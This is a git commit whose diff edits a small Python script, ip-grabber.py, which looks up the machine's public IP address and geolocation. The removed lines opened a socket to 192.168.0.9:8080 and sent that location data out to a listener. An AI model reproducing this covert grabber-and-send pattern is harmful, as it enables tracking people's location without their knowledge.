ed2e710982831782828ad203533f8032c0d6af24
modules0928 <anaguimaraes1414@gmail.com>
2025-08-19 23:46:39 -0300

    Update ip-grabber.py

--- ip-grabber.py
+++ ip-grabber.py
@@ -1,9 +1,5 @@
 import requests
 import json
-import socket
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('192.168.0.9', 8080))
 
 def ip_grabber():
     ip = requests.get('https://api.ipify.org?format=json').text
@@ -12,5 +8,4 @@ def ip_grabber():
     geolocation = requests.get(f'http://ip-api.com/json/{ip_t}').text
     return geolocation
 
-s.send(ip_grabber().encode())
-s.close()
+temp_var = ip_grabber()
